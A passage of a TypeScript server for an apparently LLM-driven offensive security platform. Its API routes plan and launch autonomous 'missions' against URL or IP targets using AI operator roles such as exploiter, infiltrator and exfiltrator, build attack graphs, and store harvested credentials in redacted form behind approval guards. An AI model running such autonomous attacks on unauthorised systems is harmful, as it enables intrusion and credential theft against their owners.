      missionName: name,
      operators: spawnedOps,
      targets: cmd.targetEnv.getAllTargets().map(t => ({ id: t.id, address: t.address, type: t.type })),
      status: cmd.getStatus(),
      ...(whitebox ? { whitebox } : {}),
    });
  } catch (error: any) {
    console.error('[T3MP3ST] Mission start failed:', error);
    res.status(500).json({ error: error.message || 'Failed to start mission' });
  } finally {
    repoSource?.cleanup();
  }
});

/**
 * POST /api/whitebox/analyze — run the full white-box pipeline against a LOCAL repo.
 *
 * Body: { repoPath, objective, maxRounds? }
 *
 * This analyzes LOCAL source you OWN (no network target, no probing) — the
 * code-ingest → context-pack → DecompositionOrchestrator chain. It is LLM-HEAVY
 * (multiple orchestrator + worker round-trips), so it may take a while to return.
 */
app.post('/api/whitebox/analyze', async (req: Request, res: Response): Promise<void> => {
  const { repoPath, objective, maxRounds } = req.body as {
    repoPath?: unknown;
    objective?: unknown;
    maxRounds?: unknown;
  };

  if (typeof objective !== 'string' || !objective.trim()) {
    res.status(400).json({ error: 'objective required' });
    return;
  }
  try {
    const result = await runWhiteboxAnalysis({
      repoPath: typeof repoPath === 'string' ? repoPath : '',
      objective,
      maxRounds: typeof maxRounds === 'number' ? maxRounds : undefined,
    });
    res.json(result);
  } catch (error: any) {
    console.error('[T3MP3ST] White-box analysis failed:', error);
    if (error instanceof RepoPathError || error instanceof RepoCloneError) {
      res.status(400).json({ error: error.message });
      return;
    }
    res.status(500).json({ error: error?.message || 'White-box analysis failed' });
  }
});

/**
 * GET /api/mission/report and GET /api/mission/:id/report — export the engagement
 * report (markdown) for the given mission id, or the active mission if none is
 * given. 404 when there is no mission / nothing to report.
 */
function handleMissionReport(req: Request, res: Response): void {
  const cmd = getTempestCommand();
  if (!cmd) {
    res.status(404).json({ error: 'No active mission' });
    return;
  }
  const missionId = typeof req.params.id === 'string' && req.params.id ? req.params.id : undefined;
  try {
    const report = cmd.generateReport(missionId);
    res.json({ success: true, missionId: missionId || null, report });
  } catch (error: any) {
    // generateReport throws when no mission is found for reporting.
    res.status(404).json({ error: error?.message || 'No mission found for reporting' });
  }
}
app.get('/api/mission/report', (req: Request, res: Response) => handleMissionReport(req, res));
app.get('/api/mission/:id/report', (req: Request, res: Response) => handleMissionReport(req, res));

/**
 * POST /api/mission/stop — Stop the active mission
 */
app.post('/api/mission/stop', (_req: Request, res: Response) => {
  const cmd = getTempestCommand();
  if (!cmd) {
    res.status(404).json({ error: 'No active mission' });
    return;
  }

  cmd.stop();
  // Stop the General's sitrep interval too — otherwise startMonitoring's setInterval
  // leaks and keeps firing against a dead mission.
  if (activeGeneral) activeGeneral.stopMonitoring();
  broadcastEvent('mission:stopped', { timestamp: Date.now() });
  res.json({ success: true, message: 'Mission stopped' });
});

/**
 * POST /api/mission/pause — Pause the active mission
 */
app.post('/api/mission/pause', (_req: Request, res: Response) => {
  const cmd = getTempestCommand();
  if (!cmd) {
    res.status(404).json({ error: 'No active mission' });
    return;
  }

  cmd.pause();
  broadcastEvent('mission:paused', { timestamp: Date.now() });
  res.json({ success: true, message: 'Mission paused' });
});

/**
 * POST /api/mission/resume — Resume a paused mission
 */
app.post('/api/mission/resume', (_req: Request, res: Response) => {
  const cmd = getTempestCommand();
  if (!cmd) {
    res.status(404).json({ error: 'No active mission' });
    return;
  }

  cmd.resume();
  broadcastEvent('mission:resumed', { timestamp: Date.now() });
  res.json({ success: true, message: 'Mission resumed' });
});

/**
 * GET /api/mission/status — Get full mission status
 */
app.get('/api/mission/status', (_req: Request, res: Response) => {
  const cmd = getTempestCommand();
  if (!cmd) {
    res.json({ active: false, progress: [], tasks: [] });
    return;
  }

  const status = cmd.getStatus();
  const mission = cmd.mission.getActiveMission();
  const findings = cmd.vault.getAllFindings();
  const allOperators = cmd.cell.getAllOperators().map(op => op.getSummary());

  res.json({
    active: status.running,
    paused: status.paused,
    stallReason: status.stallReason,
    name: status.name,
    tickCount: status.tickCount,
    mission: mission ? {
      id: mission.id,
      name: mission.name,
      status: mission.status,
      currentPhase: mission.currentPhase,
      progress: mission.progress,
      startedAt: mission.startedAt,
    } : null,
    operators: {
      summary: status.operators,
      details: allOperators,
    },
    targets: status.targets,
    vault: status.vault,
    opsec: status.opsec,
    tasks: status.tasks,
    progress: status.progress,
    findings: findings.map(f => ({
      id: f.id,
      title: f.title,
      severity: f.severity,
      phase: f.phase,
      operatorId: f.operatorId,
      discoveredAt: f.discoveredAt,
    })),
  });
});

/**
 * POST /api/operators/spawn — Spawn an operator on the backend
 *
 * Body: { archetype: string, callsign?: string }
 */
// ── Operatives: per-archetype prompt + sampling-param overrides (powers the Operatives tab) ──
const VALID_ARCHETYPES: OperatorArchetype[] = ['recon', 'scanner', 'exploiter', 'infiltrator', 'exfiltrator', 'ghost', 'coordinator', 'analyst'];

app.get('/api/operators/prompts', (_req: Request, res: Response) => {
  res.json({ operators: listOperatorPrompts() });
});

app.post('/api/operators/prompt', (req: Request, res: Response): void => {
  const { archetype, systemPrompt, params } = req.body as { archetype?: string; systemPrompt?: string; params?: OperatorOverride['params'] };
  if (!archetype || !VALID_ARCHETYPES.includes(archetype as OperatorArchetype)) {
    res.status(400).json({ error: `Valid archetype required (${VALID_ARCHETYPES.join(', ')})` });
    return;
  }
  const override: OperatorOverride = {};
  if (typeof systemPrompt === 'string') override.systemPrompt = systemPrompt;
  if (params && typeof params === 'object') override.params = params;
  if (override.systemPrompt === undefined && !override.params) {
    res.status(400).json({ error: 'Provide systemPrompt and/or params to override' });
    return;
  }
  setOperatorOverride(archetype as OperatorArchetype, override);
  broadcastEvent('operator:prompt_updated', { archetype, hasPrompt: override.systemPrompt !== undefined, hasParams: !!override.params });
  const updated = listOperatorPrompts().find(o => o.archetype === archetype);
  res.json({ ok: true, archetype, operator: updated });
});

app.post('/api/operators/prompt/reset', (req: Request, res: Response): void => {
  const { archetype } = req.body as { archetype?: string };
  if (!archetype || !VALID_ARCHETYPES.includes(archetype as OperatorArchetype)) {
    res.status(400).json({ error: 'Valid archetype required' });
    return;
  }
  resetOperatorOverride(archetype as OperatorArchetype);
  broadcastEvent('operator:prompt_updated', { archetype, reset: true });
  const updated = listOperatorPrompts().find(o => o.archetype === archetype);
  res.json({ ok: true, archetype, operator: updated });
});

app.post('/api/operators/spawn', (req: Request, res: Response): void => {
  const cmd = getTempestCommand();
  if (!cmd) {
    res.status(400).json({ error: 'No active mission — start a mission first' });
    return;
  }

  const { archetype, callsign } = req.body;
  if (!archetype) {
    res.status(400).json({ error: 'archetype required' });
    return;
  }

  const effectiveCallsign = callsign || (archetype.charAt(0).toUpperCase() + archetype.slice(1) + '-' + Date.now().toString(36));

  try {
    const op = cmd.spawnOperator(effectiveCallsign, archetype as OperatorArchetype);
    broadcastEvent('operator:spawned', { id: op.id, callsign: op.callsign, archetype });
    res.json({ success: true, operator: op.getSummary() });
  } catch (error: any) {
    res.status(400).json({ error: error.message });
  }
});

/**
 * POST /api/operators/terminate — Terminate an operator
 *
 * Body: { operatorId: string }
 */
app.post('/api/operators/terminate', (req: Request, res: Response): void => {
  const cmd = getTempestCommand();
  if (!cmd) {
    res.status(400).json({ error: 'No active mission' });
    return;
  }

  const { operatorId } = req.body;
  if (!operatorId) {
    res.status(400).json({ error: 'operatorId required' });
    return;
  }

  const removed = cmd.cell.removeOperator(operatorId);
  if (removed) {
    broadcastEvent('operator:terminated', { id: operatorId });
    res.json({ success: true });
  } else {
    res.status(404).json({ error: 'Operator not found' });
  }
});

/**
 * GET /api/operators/list — List all operators and their status
 */
app.get('/api/operators/list', (_req: Request, res: Response) => {
  const cmd = getTempestCommand();
  if (!cmd) {
    res.json({ operators: [], cell: null });
    return;
  }

  res.json({
    operators: cmd.cell.getAllOperators().map(op => op.getSummary()),
    cell: cmd.cell.getStatus(),
  });
});

/**
 * POST /api/operators/:id/task — Dispatch a task to a specific operator
 *
 * Body: { taskName, taskDescription, phase?, priority? }
 */
app.post('/api/operators/:id/task', async (req: Request, res: Response): Promise<void> => {
  const cmd = getTempestCommand();
  if (!cmd) {
    res.status(400).json({ error: 'No active mission' });
    return;
  }

  const operator = cmd.cell.getOperator(req.params.id);
  if (!operator) {
    res.status(404).json({ error: 'Operator not found' });
    return;
  }

  if (!operator.isAvailable()) {
    res.status(409).json({ error: `Operator not available (status: ${operator.status})` });
    return;
  }

  const {
    taskName = 'Manual Task',
    taskDescription = '',
    phase = 'reconnaissance',
    priority = 5,
  } = req.body;

  const mission = cmd.mission.getActiveMission();
  const task = {
    id: `task-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
    missionId: mission?.id || 'manual',
    name: taskName,
    description: taskDescription,
    phase,
    operatorType: operator.archetype,
    status: 'pending' as const,
    priority,
    dependencies: [],
    createdAt: Date.now(),
  };

  broadcastEvent('task:dispatched', {
    taskId: task.id,
    operatorId: operator.id,
    callsign: operator.callsign,
    taskName,
  });

  // Execute asynchronously — return immediately with task ID
  const targets = cmd.targetEnv.getAllTargets();
  if (targets.length === 0) {
    res.status(400).json({ error: 'No targets available for task dispatch' });
    return;
  }
  const target = targets[0];

  operator.assignTask(task, target).then((result) => {
    broadcastEvent('task:completed', {
      taskId: task.id,
      operatorId: operator.id,
      callsign: operator.callsign,
      success: result.success,
      output: (result.output || '').substring(0, 2000),
      ...(result.findings && { findings: result.findings }),
    });
  }).catch((error: any) => {
    broadcastEvent('task:failed', {
      taskId: task.id,
      operatorId: operator.id,
      callsign: operator.callsign,
      error: error.message,
    });
  });

  res.json({
    success: true,
    taskId: task.id,
    operatorId: operator.id,
    message: 'Task dispatched — follow /api/events SSE for results',
  });
});

/**
 * GET /api/mission/findings — Get all findings from the current mission
 */
app.get('/api/mission/findings', (_req: Request, res: Response) => {
  const cmd = getTempestCommand();
  if (!cmd) {
    res.json({ findings: [] });
    return;
  }

  res.json({
    findings: cmd.vault.getAllFindings(),
    // Redact: never return raw harvested secrets over the API (only metadata + a
    // secretCaptured flag). Loopback-only mitigates, but a security tool must not dump
    // secrets in its own responses (external-audit P0).
    credentials: cmd.cell.getAllCredentials().map(redactCredential),
  });
});

// =============================================================================
// OP GENERAL — AUTONOMOUS OPERATION ORCHESTRATOR
// =============================================================================

/** Active OpGeneral instance */
let activeGeneral: OpGeneral | null = null;

function providerNeedsApiKey(provider: string): boolean {
  return !['codex', 'mock', 'local', 'local-agent'].includes(provider);
}

function providerRunsKeyless(provider: string): boolean {
  return !providerNeedsApiKey(provider);
}

function readPositiveTimeoutEnv(name: string): number | undefined {
  const raw = process.env[name];
  if (raw == null || raw.trim() === '') return undefined;
  const parsed = Number(raw);
  return Number.isFinite(parsed) && parsed > 0 ? parsed : undefined;
}

function readGeneralTimeoutEnv(): number | undefined {
  return readPositiveTimeoutEnv('TEMPEST_GENERAL_TIMEOUT_MS')
    ?? readPositiveTimeoutEnv('T3MP3ST_GENERAL_TIMEOUT_MS');
}

// SECURITY NOTE: `apiKey` is accepted from the request BODY here (and in the
// mission/general routes that call this). Sending secrets in the body is not
// ideal — an Authorization header is preferred — but the same-origin UI posts
// the key in the body, so we accept it to avoid breaking it. Moving to a header
// needs a coordinated UI change and is out of scope. The body key is only ever
// reachable from the local operator (loopback bind + origin guard).
function resolveGeneralLLMConfig(provider: string | undefined, model: string | undefined, apiKey: string | undefined): {
  provider: any;
  model: string;
  apiKey?: string;
  baseUrl?: string;
  maxTokens: number;
  temperature: number;
  timeout: number;
} {
  const defaultConfig = config.getLLMConfig();
  const selectedProvider = provider || defaultConfig.provider;
  // Local-agent backends (Claude Code / Codex / Hermes via the connector) need NO API key — the
  // agent uses its own login. The agent id (codex|claude|hermes) travels in `model`.
  if (selectedProvider === 'local-agent') {
    return {
      provider: 'local-agent' as any,
      model: model || 'codex',
      maxTokens: 8192,
      temperature: 0.4,
      timeout: readGeneralTimeoutEnv()
        ?? readPositiveTimeoutEnv('T3MP3ST_LOCAL_AGENT_TIMEOUT_MS')
        ?? 600000,
    };
  }
  const baseConfig = config.getLLMConfig(selectedProvider as any, model);
  const effectiveKey = apiKey || baseConfig.apiKey;
  if (providerNeedsApiKey(selectedProvider) && !effectiveKey) {
    throw new Error('API key required — pass apiKey in body or configure on server');
  }
  return {
    provider: selectedProvider as any,
    model: model || baseConfig.model,
    apiKey: effectiveKey,
    baseUrl: baseConfig.baseUrl,
    maxTokens: 8192,
    temperature: 0.4,
    timeout: readGeneralTimeoutEnv() ?? 300000, // General planning needs room (was a hardcoded 60s); override via env
  };
}

/**
 * Bring a planned mission UP for real: create the TempestCommand, add targets,
 * spawn the planned operators, start the mission, and attach General monitoring.
 * Shared by /api/general/execute and the Admiral LIVE launch so the conversational
 * front door performs the SAME real bring-up — not a "mission launching" stub.
 */
function bringUpMissionFromPlan(
  execConfig: { missionName: string; targets: string[]; operators: string[] },
  generalConfig: { apiKey?: string; provider: any; model: string },
): { spawnedOps: Array<{ id: string; callsign: string; archetype: string }>; status: any } {
  const cmd = createTempestCommandInstance(execConfig.missionName, generalConfig.apiKey, generalConfig.provider, generalConfig.model);
  for (const target of execConfig.targets) {
    if (target.startsWith('http://') || target.startsWith('https://')) cmd.targetEnv.addTarget(createTargetFromUrl(target));
    else if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(target)) cmd.targetEnv.addTarget(createTargetFromIP(target));
    else cmd.targetEnv.addTarget(createTargetFromUrl(`http://${target}`));
  }
  const spawnedOps: Array<{ id: string; callsign: string; archetype: string }> = [];
  const operatorCounts = new Map<string, number>();
  for (const archetype of execConfig.operators) {
    const count = (operatorCounts.get(archetype) || 0) + 1;
    operatorCounts.set(archetype, count);
    const callsign = archetype.charAt(0).toUpperCase() + archetype.slice(1) + `-G${count}`;
    try { const op = cmd.spawnOperator(callsign, archetype as any); spawnedOps.push({ id: op.id, callsign: op.callsign, archetype }); } catch { /* dup */ }
  }
  cmd.start();
  if (activeGeneral) activeGeneral.startMonitoring(cmd);
  return { spawnedOps, status: cmd.getStatus() };
}

async function runCodexExecReadinessProbe(command: string): Promise<{ stdout: string; stderr: string }> {
  const marker = 'T3MP3ST_CODEX_READY';
  const args = [
    'exec',
    '-c',
    'model_reasoning_effort="low"',
    '--ephemeral',
    '--skip-git-repo-check',
    '--sandbox',
    'read-only',
    '--color',
    'never',
    '-C',
    process.cwd(),
    '-',
  ];

  return new Promise((resolve, reject) => {
    const child = spawn(command, args, {
      stdio: ['pipe', 'pipe', 'pipe'],
      env: { ...process.env, NO_COLOR: '1' },
    });

    let stdout = '';
    let stderr = '';
    const timer = setTimeout(() => {
      child.kill('SIGTERM');
      reject(new Error('Codex exec readiness probe timed out'));
    }, 60000);

    // Bounded accumulation so a runaway/verbose child can't grow these strings without limit
    // before the 30s timer fires (matches the local-agent caps). A normal probe emits a tiny
    // marker, so this only trims a pathological flood.
    child.stdout.on('data', chunk => { if (stdout.length < 8_000_000) stdout += chunk.toString(); });
    child.stderr.on('data', chunk => { if (stderr.length < 200_000) stderr += chunk.toString(); });
    child.on('error', error => {
      clearTimeout(timer);
      reject(error);
    });
    child.on('close', code => {
      clearTimeout(timer);
      if (code === 0 && stdout.includes(marker)) {
        resolve({ stdout, stderr });
      } else if (code === 0) {
        reject(new Error(`Codex exec completed without ready marker: ${(stdout || stderr).trim().slice(0, 1000)}`));
      } else {
        reject(new Error(`Codex exec exited ${code}: ${(stderr || stdout).trim().slice(0, 1000)}`));
      }
    });

    child.stdin.end(`Reply with exactly: ${marker}`);
  });
}

/**
 * GET /api/codex/status — Check whether local Codex CLI/account auth can be used.
 */
function codexUnavailable(res: Response, error: any): void {
  res.status(503).json({
    available: false,
    provider: 'codex',
    error: error?.message || 'Codex CLI unavailable',
    hint: 'Install/login to Codex CLI, then retry. T3MP3ST does not need your account token.',
  });
}

// GET is read-only: version + availability, NO exec. B-04: the exec self-test
// runs `codex exec`, so it must NOT be reachable by a GET (drive-by / CSRF-able);
// it lives on POST /api/codex/probe below, behind the cross-origin guard.
app.get('/api/codex/status', async (_req: Request, res: Response): Promise<void> => {
  try {
    const command = config.get('codex').command || 'codex';
    const { stdout } = await execFileAsync(command, ['--version'], { timeout: 5000 });
    res.json({
      available: true,
      provider: 'codex',
      authMode: 'local-codex-account',
      tokenHandling: 'no token is accepted by or returned from T3MP3ST',
      command,
      version: stdout.trim(),
      executionMode: 'codex exec --ephemeral --sandbox read-only',
      execProbe: 'POST /api/codex/probe',   // exec self-test moved off GET (B-04)
    });
  } catch (error: any) {
    codexUnavailable(res, error);
  }
});

// B-04: Codex exec readiness self-test — POST (not GET) so the cross-origin CSRF
// guard covers it; a drive-by page can't trigger `codex exec` via a bare GET.
// Returns availability + version plus the exec self-test result.
app.post('/api/codex/probe', async (_req: Request, res: Response): Promise<void> => {
  try {
    const command = config.get('codex').command || 'codex';
    const { stdout } = await execFileAsync(command, ['--version'], { timeout: 5000 });
    const payload: Record<string, unknown> = {
      available: true,
      provider: 'codex',
      command,
      version: stdout.trim(),
      executionMode: 'codex exec --ephemeral --sandbox read-only',
    };
    try {
      const probe = await runCodexExecReadinessProbe(command);
      const combined = `${probe.stdout || ''}\n${probe.stderr || ''}`;
      payload.execReady = combined.includes('T3MP3ST_CODEX_READY');
      payload.selfTest = payload.execReady ? 'passed' : 'completed_without_ready_marker';
    } catch (probeError: any) {
      payload.execReady = false;
      payload.selfTest = 'failed';
      payload.executionError = String(probeError?.stderr || probeError?.message || probeError).trim().slice(0, 1000);
    }
    res.json(payload);
  } catch (error: any) {
    codexUnavailable(res, error);
  }
});

/**
 * POST /api/general/plan — Give the General a directive, get back an OpPlan
 *
 * Body: { objective: string, constraints?: string, scopeHints?: string,
 *         urgency?: string, opsecPreference?: string, apiKey?: string,
 *         provider?: string, model?: string }
 */
app.post('/api/general/plan', async (req: Request, res: Response): Promise<void> => {
  const {
    objective,
    constraints,
    scopeHints,
    urgency,
    opsecPreference,
    apiKey,
    provider,
    model,
  } = req.body;

  if (!objective) {
    res.status(400).json({ error: 'Objective required — tell the General what you want to accomplish' });
    return;
  }

  try {
    const generalConfig = resolveGeneralLLMConfig(provider, model, apiKey);
    // Create a dedicated LLM backbone for the General
    const generalLLM = new LLMBackbone(generalConfig);

    // Stop the outgoing General's monitor before we drop the reference — otherwise its
    // sitrep setInterval leaks and keeps firing after we replace the instance.
    if (activeGeneral) activeGeneral.stopMonitoring();
    activeGeneral = new OpGeneral(generalLLM);

    // Wire General events to SSE
    activeGeneral.on('general:planning', (data) => broadcastEvent('general:planning', data as any));
    activeGeneral.on('general:plan_ready', (data) => broadcastEvent('general:plan_ready', data as any));
    activeGeneral.on('general:review', (data) => broadcastEvent('general:review', data as any));
    activeGeneral.on('general:plan_failed', (data) => broadcastEvent('general:plan_failed', data as any));
    activeGeneral.on('general:sitrep', (data) => broadcastEvent('general:sitrep', data as any));
    activeGeneral.on('general:adapting', (data) => broadcastEvent('general:adapting', data as any));
    activeGeneral.on('general:assessment', (data) => broadcastEvent('general:assessment', data as any));

    const directive: Directive = {
      objective,
      constraints,
      scopeHints,
      urgency,
      opsecPreference,
    };

    broadcastEvent('general:planning', { directive });

    const plan = await activeGeneral.planOperation(directive);
    const review = activeGeneral.reviewPlan(plan);

    res.json({
      success: true,
      plan,
      review,
      missionGate: plan.missionGate,
    });
  } catch (error: any) {
    console.error('[T3MP3ST] General planning failed:', error);
    const message = error.message || 'Planning failed';
    res.status(/API key required|Unknown provider/.test(message) ? 400 : 500).json({ error: message });
  }
});

/**
 * POST /api/general/execute — Execute the General's plan (creates mission + starts it)
 *
 * Body: { apiKey?: string, provider?: string, model?: string }
 * Requires: A plan must exist (call /api/general/plan first)
 */
app.post('/api/general/execute', async (req: Request, res: Response): Promise<void> => {
  if (!activeGeneral) {
    res.status(400).json({ error: 'No General active — call /api/general/plan first' });
    return;
  }

  const plan = activeGeneral.getCurrentPlan();
  if (!plan) {
    res.status(400).json({ error: 'No plan available — call /api/general/plan first' });
    return;
  }

  const {
    apiKey,
    provider,
    model,
  } = req.body;

  let generalConfig;
  try {
    generalConfig = resolveGeneralLLMConfig(provider, model, apiKey);
  } catch (error: any) {
    res.status(400).json({ error: error.message || 'API key required' });
    return;
  }

  try {
    // Get execution config from the General's plan
    const execConfig = activeGeneral.executePlan();
    if (execConfig.review.status === 'hold') {
      res.status(409).json({
        error: 'General plan gate is HOLD',
        review: execConfig.review,
        missionGate: execConfig.missionGate,
        nextActions: execConfig.review.recommendedNextActions,
      });
      return;
    }
    for (const target of execConfig.targets) {
      const guard = guardAction(req.body as Record<string, unknown>, 'mission_execution', target, `Execute General plan ${plan.codename} against ${target}`);
      if (!guard.allowed) { blockForApproval(res, guard); return; }
    }

    // Create TempestCommand instance from the plan
    const cmd = createTempestCommandInstance(
      execConfig.missionName,
      generalConfig.apiKey,
      generalConfig.provider,
      generalConfig.model
    );

    // Add targets from the plan
    for (const target of execConfig.targets) {
      if (target.startsWith('http://') || target.startsWith('https://')) {
        cmd.targetEnv.addTarget(createTargetFromUrl(target));
      } else if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(target)) {
        cmd.targetEnv.addTarget(createTargetFromIP(target));
      } else {
        cmd.targetEnv.addTarget(createTargetFromUrl(`http://${target}`));
      }
    }

    // Spawn operators from the plan
    const spawnedOps: Array<{ id: string; callsign: string; archetype: string }> = [];
    const operatorCounts = new Map<string, number>();
    for (const archetype of execConfig.operators) {
      const count = (operatorCounts.get(archetype) || 0) + 1;
      operatorCounts.set(archetype, count);
      const callsign = archetype.charAt(0).toUpperCase() + archetype.slice(1) + `-G${count}`;
      try {
        const op = cmd.spawnOperator(callsign, archetype);
        spawnedOps.push({ id: op.id, callsign: op.callsign, archetype });
      } catch {
        // Skip duplicate
      }
    }

    // Start the mission
    cmd.start();

    // Start General monitoring
    activeGeneral.startMonitoring(cmd);

    broadcastEvent('general:executing', {
      codename: plan.codename,
      targets: execConfig.targets,
      operators: spawnedOps,
      operatorAssignments: execConfig.operatorAssignments,
      workOrders: execConfig.workOrders,
      missionGate: execConfig.missionGate,
      review: execConfig.review,
      opsecLevel: execConfig.opsecLevel,
    });

    res.json({
      success: true,
      codename: plan.codename,
      missionName: execConfig.missionName,
      targets: execConfig.targets,
      operators: spawnedOps,
      operatorAssignments: execConfig.operatorAssignments,
      workOrders: execConfig.workOrders,
      missionGate: execConfig.missionGate,
      review: execConfig.review,
      opsecLevel: execConfig.opsecLevel,
      status: cmd.getStatus(),
    });
  } catch (error: any) {
    console.error('[T3MP3ST] General execution failed:', error);
    res.status(500).json({ error: error.message || 'Execution failed' });
  }
});

/**
 * POST /api/general/auto — Full autonomous mode: plan + execute in one call
 *
 * Body: { objective: string, constraints?, scopeHints?, urgency?,
 *         opsecPreference?, apiKey?, provider?, model? }
 */
app.post('/api/general/auto', async (req: Request, res: Response): Promise<void> => {
  const {
    objective,
    constraints,
    scopeHints,
    urgency,
    opsecPreference,
    apiKey,
    provider,
    model,
  } = req.body;

  if (!objective) {
    res.status(400).json({ error: 'Objective required' });
    return;
  }

  let generalConfig;
  try {
    generalConfig = resolveGeneralLLMConfig(provider, model, apiKey);
  } catch (error: any) {
    res.status(400).json({ error: error.message || 'API key required' });
    return;
  }

  const autoGuard = guardAction(req.body as Record<string, unknown>, 'autonomous_execution', '*', `Run full autonomous General mode for: ${objective}`);
  if (!autoGuard.allowed) { blockForApproval(res, autoGuard); return; }

  try {
    // Create General
    const generalLLM = new LLMBackbone(generalConfig);

    // Stop the outgoing General's monitor before dropping the reference (setInterval leak).
    if (activeGeneral) activeGeneral.stopMonitoring();
    activeGeneral = new OpGeneral(generalLLM);

    // Wire events
    activeGeneral.on('general:planning', (data) => broadcastEvent('general:planning', data as any));
    activeGeneral.on('general:plan_ready', (data) => broadcastEvent('general:plan_ready', data as any));
    activeGeneral.on('general:review', (data) => broadcastEvent('general:review', data as any));
    activeGeneral.on('general:sitrep', (data) => broadcastEvent('general:sitrep', data as any));
    activeGeneral.on('general:adapting', (data) => broadcastEvent('general:adapting', data as any));
    activeGeneral.on('general:assessment', (data) => broadcastEvent('general:assessment', data as any));

    // Phase 1: Plan
    broadcastEvent('general:planning', { objective });

    const plan = await activeGeneral.planOperation({
      objective, constraints, scopeHints, urgency, opsecPreference,
    });

    // Phase 2: Execute
    const execConfig = activeGeneral.executePlan();
    if (execConfig.review.status === 'hold') {
      res.status(409).json({
        error: 'General plan gate is HOLD',
        mode: 'full_auto',
        plan,
        review: execConfig.review,
        missionGate: execConfig.missionGate,
        nextActions: execConfig.review.recommendedNextActions,
      });
      return;
    }

    for (const target of execConfig.targets) {
      const guard = guardAction(req.body as Record<string, unknown>, 'mission_execution', target, `Execute General auto plan ${plan.codename} against ${target}`);
      if (!guard.allowed) { blockForApproval(res, guard); return; }
    }

    const cmd = createTempestCommandInstance(
      execConfig.missionName,
      generalConfig.apiKey,
      generalConfig.provider,
      generalConfig.model
    );

    for (const target of execConfig.targets) {
      if (target.startsWith('http://') || target.startsWith('https://')) {
        cmd.targetEnv.addTarget(createTargetFromUrl(target));
      } else if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(target)) {
        cmd.targetEnv.addTarget(createTargetFromIP(target));
      } else {
        cmd.targetEnv.addTarget(createTargetFromUrl(`http://${target}`));
      }
    }

    const spawnedOps: Array<{ id: string; callsign: string; archetype: string }> = [];
    const operatorCounts = new Map<string, number>();
    for (const archetype of execConfig.operators) {
      const count = (operatorCounts.get(archetype) || 0) + 1;
      operatorCounts.set(archetype, count);
      const callsign = archetype.charAt(0).toUpperCase() + archetype.slice(1) + `-G${count}`;
      try {
        const op = cmd.spawnOperator(callsign, archetype);
        spawnedOps.push({ id: op.id, callsign: op.callsign, archetype });
      } catch { /* skip duplicate */ }
    }

    cmd.start();
    activeGeneral.startMonitoring(cmd);

    broadcastEvent('general:executing', {
      codename: plan.codename,
      targets: execConfig.targets,
      operators: spawnedOps,
      operatorAssignments: execConfig.operatorAssignments,
      workOrders: execConfig.workOrders,
      missionGate: execConfig.missionGate,
      review: execConfig.review,
    });

    res.json({
      success: true,
      mode: 'full_auto',
      plan,
      execution: {
        codename: plan.codename,
        missionName: execConfig.missionName,
        targets: execConfig.targets,
        operators: spawnedOps,
        operatorAssignments: execConfig.operatorAssignments,
        workOrders: execConfig.workOrders,
        missionGate: execConfig.missionGate,
        review: execConfig.review,
        opsecLevel: execConfig.opsecLevel,
      },
      status: cmd.getStatus(),
    });
  } catch (error: any) {
    console.error('[T3MP3ST] General auto mode failed:', error);
    res.status(500).json({ error: error.message || 'Auto mode failed' });
  }
});

/**
 * GET /api/general/plan — Get the current plan
 */
app.get('/api/general/plan', (_req: Request, res: Response) => {
  if (!activeGeneral) {
    res.json({ plan: null });
    return;
  }
  res.json({ plan: activeGeneral.getCurrentPlan() });
});

/**
 * GET /api/general/sitreps — Get all situation reports
 */
app.get('/api/general/sitreps', (_req: Request, res: Response) => {
  if (!activeGeneral) {
    res.json({ sitreps: [] });
    return;
  }
  res.json({ sitreps: activeGeneral.getSitreps() });
});

/**
 * POST /api/general/sitrep — Force a situation report now
 */
app.post('/api/general/sitrep', async (_req: Request, res: Response): Promise<void> => {
  if (!activeGeneral) {
    res.status(400).json({ error: 'No General active' });
    return;
  }

  const cmd = getTempestCommand();
  if (!cmd) {
    res.status(400).json({ error: 'No active mission' });
    return;
  }

  try {
    const sitrep = await activeGeneral.produceSitrep(cmd);
    res.json({ success: true, sitrep });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

/**
 * POST /api/general/assess — Produce final strategic assessment
 */
app.post('/api/general/assess', async (_req: Request, res: Response): Promise<void> => {
  if (!activeGeneral) {
    res.status(400).json({ error: 'No General active' });
    return;
  }

  const cmd = getTempestCommand();
  if (!cmd) {
    res.status(400).json({ error: 'No active mission' });
    return;
  }

  try {
    const assessment = await activeGeneral.produceAssessment(cmd);
    res.json({ success: true, assessment });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// =============================================================================
// ATTACK GRAPH — recon-generated structure, rendered in one consistent style
// =============================================================================

import {
  scaffoldAttackGraph, validateAttackGraph, attackGraphReconPrompt, familyPhases,
  ATTACK_GRAPH_SCHEMA, type AttackGraph,
} from './recon/attack-graph.js';

/**
 * POST /api/attack-graph — get an attack graph for a target.
 * Body: { target, family? }
 * Returns a deterministic SCAFFOLD (phase columns + target_root + recon-pending
 * candidate nodes). The structure varies by target+family; the UI renders any
 * conforming graph in the same visual style. Recon agents later replace/extend
 * it via the schema + prompt also returned here.
 */
app.post('/api/attack-graph', (req: Request, res: Response): void => {
  try {
    const { target, family = 'default' } = req.body as { target?: string; family?: string };
    if (!target || typeof target !== 'string') {
      res.status(400).json({ error: 'target (string) required' });
      return;
    }
    const graph: AttackGraph = scaffoldAttackGraph(target, family);
    res.json({
      graph,
      reconScaffold: {
        phases: familyPhases(family),
        schema: ATTACK_GRAPH_SCHEMA,
        prompt: attackGraphReconPrompt(target, family),
      },
    });
  } catch (error: any) {
    res.status(400).json({ error: error.message });
  }
});

/**
 * POST /api/attack-graph/ingest — accept a recon-agent- or client-supplied graph,
 * validate/normalize it against the schema, and echo it back for rendering.
 */
app.post('/api/attack-graph/ingest', (req: Request, res: Response): void => {
  try {
    const graph = validateAttackGraph(req.body?.graph ?? req.body);
    res.json({ graph });
  } catch (error: any) {
    res.status(400).json({ error: error.message });
  }
});

// =============================================================================
// THE ADMIRAL — conversational mission intake (NL → directive → Op General)
// =============================================================================

import { Admiral, briefToDirective, type ChatMsg, type MissionBrief } from './admiral/index.js';

/**
 * POST /api/admiral/converse — one conversational turn with the Admiral.
 * Body: { messages: [{role:'user'|'assistant', content}], provider?, model?, apiKey? }
 * Returns: { reply, brief, missing, ready }  (no execution — intake only)
 */
